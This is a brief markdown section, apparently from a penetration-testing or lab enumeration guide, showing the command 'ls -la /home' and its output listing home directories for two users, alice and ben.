# 13. Home Directory Enumeration

## List Home Directories

```bash
ls -la /home
```

Output:

```
drwxr-x---  2 alice alice 4096 Mar 16 14:12 alice
drwxr-x---  3 ben   ben   4096 Mar 16 14:12 ben
```

